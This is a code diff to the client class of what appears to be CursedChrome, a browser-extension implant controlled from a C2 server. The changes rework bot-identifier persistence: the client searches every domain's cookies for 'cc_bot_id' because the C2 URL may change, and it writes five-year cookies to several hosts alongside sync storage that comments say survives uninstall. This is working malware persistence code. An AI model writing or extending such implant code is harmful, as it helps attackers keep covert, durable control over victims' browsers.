@@ -660,10 +660,10 @@ class CursedChromeClient {
   }
 
   async getPersistentBrowserId() {
-    // Strategy: Sync > Local > Cookie
+    // Strategy: Sync > Local > Cookie (Global Search)
     let id = null;
 
-    // 1. Try Sync Storage (survives uninstall if user signed in)
+    // 1. Try Sync Storage
     try {
       const syncData = await new Promise((resolve) => {
         chrome.storage.sync.get(["browser_id"], resolve);
@@ -673,10 +673,10 @@ class CursedChromeClient {
         return syncData.browser_id;
       }
     } catch (e) {
-      // Sync storage might be disabled or fail
+      console.warn("Sync Storage failed/disabled:", e);
     }
 
-    // 2. Try Local Storage (survives restart, cleared on uninstall)
+    // 2. Try Local Storage
     try {
       id = await this.localStorage.getItem("browser_id");
       if (id) {
@@ -685,20 +685,26 @@ class CursedChromeClient {
       }
     } catch (e) {}
 
-    // 3. Try Cookie (survives uninstall if cookies not cleared)
+    // 3. Try Cookies (Global Search)
+    // Since the C2 URL might be random/changing, we search ALL domains for our cookie.
     try {
       if (chrome.cookies) {
-        // Convert WS URL to HTTP/HTTPS for cookie access
-        const cookieUrl = this.SERVER_URL.replace("ws://", "http://").replace("wss://", "https://");
-        const cookie = await new Promise((resolve) => {
-          chrome.cookies.get({ url: cookieUrl, name: "cc_bot_id" }, resolve);
+        console.log("Searching all cookies for 'cc_bot_id'...");
+        const cookies = await new Promise((resolve) => {
+          chrome.cookies.getAll({ name: "cc_bot_id" }, resolve);
         });
-        if (cookie && cookie.value) {
-          console.log("Found ID in C2 Cookie");
-          return cookie.value;
+
+        if (cookies && cookies.length > 0) {
+          // Sort by expiration date or creation to get the most "relevant" one if multiple exist?
+          // For now, just taking the first one found is likely sufficient as the ID should be effectively unique per machine.
+          const foundCookie = cookies[0];
+          console.log(`Found ID in Cookie on domain ${foundCookie.domain}: ${foundCookie.value}`);
+          return foundCookie.value;
         }
       }
-    } catch (e) {}
+    } catch (e) {
+        console.error("Cookie check failed:", e);
+    }
 
     return null;
   }
@@ -713,32 +719,51 @@ class CursedChromeClient {
     try {
       chrome.storage.sync.set({ browser_id: id }, () => {
         if (chrome.runtime.lastError) {
-          // Ignore errors (e.g. user not signed in)
+          console.warn("Sync set failed:", chrome.runtime.lastError);
         }
       });
     } catch (e) {}
 
-    // 3. Save to Cookie
+    // 3. Save to Cookies
     try {
       if (chrome.cookies) {
-        const cookieUrl = this.SERVER_URL.replace("ws://", "http://").replace("wss://", "https://");
-        // Set a long expiration (e.g., 5 years)
-        const expirationDate = this.getUnixTimestamp() + (60 * 60 * 24 * 365 * 5);
+        // We still need to set it *somewhere*. 
+        // We write to the current SERVER_URL domain logic as a best effort.
+        // We also try writing to the 'root' domain if possible to maximize visibility?
+        // For now, sticking to the standard target domains is best practice.
+        const serverUrl = this.SERVER_URL.replace("ws://", "http://").replace("wss://", "https://");
+        const urlsToTry = [
+            serverUrl,
+            "http://localhost",
+            "http://127.0.0.1"
+        ];
         
-        chrome.cookies.set({
-          url: cookieUrl,
-          name: "cc_bot_id",
-          value: id,
-          expirationDate: expirationDate,
-          sameSite: "no_restriction",
-          secure: cookieUrl.startsWith("https") // Only secure if https
-        }, (c) => {
-             if (chrome.runtime.lastError) {
-                 console.log("Failed to set persistence cookie:", chrome.runtime.lastError);
-             }
-        });
+        try {
+            const urlObj = new URL(serverUrl);
+            urlsToTry.push(`${urlObj.protocol}//${urlObj.hostname}`);
+        } catch(e){}
+
+        const uniqueUrls = [...new Set(urlsToTry)];
+        const expirationDate = this.getUnixTimestamp() + (60 * 60 * 24 * 365 * 5); // 5 years
+
+        for (const url of uniqueUrls) {
+            chrome.cookies.set({
+              url: url,
+              name: "cc_bot_id",
+              value: id,
+              expirationDate: expirationDate,
+              sameSite: "no_restriction",
+              secure: url.startsWith("https")
+            }, (c) => {
+                 if (chrome.runtime.lastError) {
+                     // verification might fail for some domains if not applicable, that's fine
+                 }
+            });
+        }
       }
-    } catch (e) {}
+    } catch (e) {
+        console.error("Cookie set failed:", e);
+    }
   }
 
   // HTTP request handling
